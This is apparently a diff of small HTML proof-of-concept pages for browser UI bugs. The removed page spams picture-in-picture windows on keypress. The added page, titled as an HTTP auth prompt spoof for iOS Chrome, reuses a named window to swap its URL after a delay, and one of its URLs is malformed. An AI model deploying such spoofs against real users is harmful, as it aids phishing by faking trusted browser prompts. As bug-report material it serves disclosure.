@@ -1,24 +1,23 @@
-<h1>Hold Enter</h1>
 
-<script>
-    let i = 0;
-    const pipOpen = async () => {
-        if (i > 5) return;
-        i++;
+<html>
+                    <head>
+                      <title>HTTP Auth Prompt Spoof IOS chrome (87.0.4280.163) </title>
+                  </head>
+                    <body>
+                      <script>
+                        (() => {
+    const button = document.createElement('button');
+    button.innerText = 'Click Me';
 
-        documentPictureInPicture.requestWindow({
-            width: 600,
-            height: 400,
-        }).then(pipWindow => {
-            pipWindow.location.href = 'https://example.com';
-        });
+    button.addEventListener('click', async () => {
+      window.open('https://google.com', 'g');
+      setTimeout(() => {
+        window.open('https://https://bugs.webkit.org', 'g');
+      }, 2000);
+    });
 
-        setTimeout(() => {
-            location.href = 'https://google.com/x';
-        }, 100);
-    };
-
-    document.body.onkeypress = () => {
-        pipOpen();
-    };
-</script>
+    document.body.appendChild(button);
+  })()
+                      </script>
+                    </body>
+                  </html>
